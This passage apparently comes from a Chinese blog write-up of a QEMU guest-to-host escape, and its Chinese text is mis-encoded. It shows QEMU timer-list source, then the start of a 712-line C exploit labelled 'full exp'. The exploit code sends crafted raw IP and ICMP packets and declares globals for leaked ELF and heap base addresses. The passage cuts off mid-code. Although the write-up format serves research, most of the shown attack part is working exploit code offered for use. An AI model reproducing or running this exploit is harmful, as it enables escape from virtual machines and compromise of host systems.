qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>    <span class="hljs-keyword">while</span> ((ts = timer_list-&gt;active_timers)) &#123;<br>        <span class="hljs-keyword">if</span> (!timer_expired_ns(ts, current_time)) &#123;<br>            <span class="hljs-comment">/* No expired timers left.  The checkpoint can be skipped</span><br><span class="hljs-comment">             * if no timers fired or they were all external.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (need_replay_checkpoint<br>                &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)) &#123;<br>            <span class="hljs-comment">/* once we got here, checkpoint clock only once */</span><br>            need_replay_checkpoint = <span class="hljs-literal">false</span>;<br>            qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>            <span class="hljs-keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) &#123;<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>            qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>            <span class="hljs-comment">/* The lock was released; start over again in case the list was</span><br><span class="hljs-comment">             * modified.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* remove timer from the list before calling the callback */</span><br>        timer_list-&gt;active_timers = ts-&gt;next;<br>        ts-&gt;next = <span class="hljs-literal">NULL</span>;<br>        ts-&gt;expire_time = <span class="hljs-number">-1</span>;<br>        cb = ts-&gt;cb;<br>        opaque = ts-&gt;opaque;<br><br>        <span class="hljs-comment">/* run the callback (the timer list can be modified) */</span><br>        qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>        cb(opaque);<span class="hljs-comment">//&lt;------è¿è¡Œè‡³æ­¤</span><br>        qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br><br>        progress = <span class="hljs-literal">true</span>;<br>    &#125;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦    <br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                                            </p><p>å®Œæ•´expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span>      <span class="hljs-comment">// struct addrinfo</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  <span class="hljs-comment">// needed for socket(), uint8_t, uint16_t, uint32_t</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span> <span class="hljs-comment">// needed for socket()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span> <span class="hljs-comment">// IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span> <span class="hljs-comment">// struct ip and IP_MAXPACKET (which is 65535)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip_icmp.h&gt;</span> <span class="hljs-comment">// struct icmp, ICMP_ECHO</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __FAVOR_BSD          <span class="hljs-comment">// Use BSD format of tcp header</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/tcp.h&gt;</span>     <span class="hljs-comment">// struct tcphdr</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span>       <span class="hljs-comment">// inet_pton() and inet_ntop()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span>       <span class="hljs-comment">// macro ioctl is defined</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/ioctls.h&gt;</span>     <span class="hljs-comment">// defines values for argument &quot;request&quot; of ioctl.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span>          <span class="hljs-comment">// struct ifreq</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span>  <span class="hljs-comment">// ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span> <span class="hljs-comment">// struct sockaddr_ll (see man 7 packet)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/ethernet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span> <span class="hljs-comment">// gettimeofday()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span> <span class="hljs-comment">// errno, perror()</span></span><br><br><span class="hljs-comment">// Define some constants.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ETH_HDRLEN 14 <span class="hljs-comment">// Ethernet header length</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IP4_HDRLEN 20 <span class="hljs-comment">// IPv4 header length</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TCP_HDRLEN 20 <span class="hljs-comment">// TCP header length, excludes options data</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ICMP_HDRLEN 8 <span class="hljs-comment">// ICMP header length for echo request, excludes data</span></span><br><br><span class="hljs-type">uint64_t</span> elf_base, heap_base, main_thread_heap_base;<br><span class="hljs-type">int</span> stop_flag;<br><span class="hljs-type">char</span>  g_interface[] = <span class="hljs-string">&quot;enp0s3&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> ip_id;<br>    <span class="hljs-type">uint16_t</span> ip_off;<br>    <span class="hljs-type">bool</span> MF;<br>    <span class="hljs-type">uint8_t</span> ip_p;<br>&#125;;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">checksum</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> *addr, <span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-type">int</span> count = len;<br>    <span class="hljs-keyword">register</span> <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint16_t</span> answer = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Sum up 2-byte values until none or only one byte left.</span><br>    <span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">1</span>) &#123;<br>        sum += *(addr++);<br>        count -= <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Add left-over byte, if any.</span><br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>        sum += *(<span class="hljs-type">uint8_t</span> *)addr;<br>    &#125;<br><br>    <span class="hljs-comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span><br>    <span class="hljs-comment">// increasing the chances of a collision.</span><br>    <span class="hljs-comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span><br>    <span class="hljs-keyword">while</span> (sum &gt;&gt; <span class="hljs-number">16</span>) &#123;<br>        sum = (sum &amp; <span class="hljs-number">0xffff</span>) + (sum &gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Checksum is one&#x27;s compliment of sum.</span><br>    answer = ~sum;<br><br>    <span class="hljs-keyword">return</span> (answer);<br>&#125;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">icmp4_checksum</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> icmp icmphdr, <span class="hljs-type">uint8_t</span> *payload, <span class="hljs-type">int</span> payloadlen)</span> &#123;<br>    <span class="hljs-type">char</span> buf[IP_MAXPACKET];<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">int</span> chksumlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br><br>    ptr = &amp;buf[<span class="hljs-number">0</span>]; <span class="hljs-comment">// ptr points to beginning of buffer buf</span><br><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_type);<br><br>    <span class="hljs-comment">// Copy Message Code to buf (8 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_code);<br><br>    <span class="hljs-comment">// Copy ICMP checksum to buf (16 bits)</span><br>    <span class="hljs-comment">// Zero, since we don&#x27;t know it yet</span><br>    *ptr = <span class="hljs-number">0</span>;<br>    ptr++;<br>    *ptr = <span class="hljs-number">0</span>;<br>    ptr++;<br>    chksumlen += <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// Copy Identifier to buf (16 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_id);<br><br>    <span class="hljs-comment">// Copy Sequence Number to buf (16 bits)</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq));<br>    ptr += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq);<br>    chksumlen += <span class="hljs-keyword">sizeof</span>(icmphdr.icmp_seq);<br><br>    <span class="hljs-comment">// Copy payload to buf</span><br>    <span class="hljs-built_in">memcpy</span>(ptr, payload, payloadlen);<br>    ptr += payloadlen;<br>    chksumlen += payloadlen;<br><br>    <span class="hljs-comment">// Pad to the next 16-bit boundary</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; payloadlen % <span class="hljs-number">2</span>; i++, ptr++) &#123;<br>        *ptr = <span class="hljs-number">0</span>;<br>        ptr++;<br>        chksumlen++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> checksum((<span class="hljs-type">uint16_t</span> *)buf, chksumlen);<br>&#125;<br><br><span class="hljs-type">uint8_t</span> *<span class="hljs-title function_">malloc_8</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 8 failed,size &lt; 0.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint8_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint8_t</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 8 error.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size);<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">uint16_t</span> *<span class="hljs-title function_">malloc_16</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 16 failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint16_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint16_t</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 16 error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> *<span class="hljs-title function_">malloc_32</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span 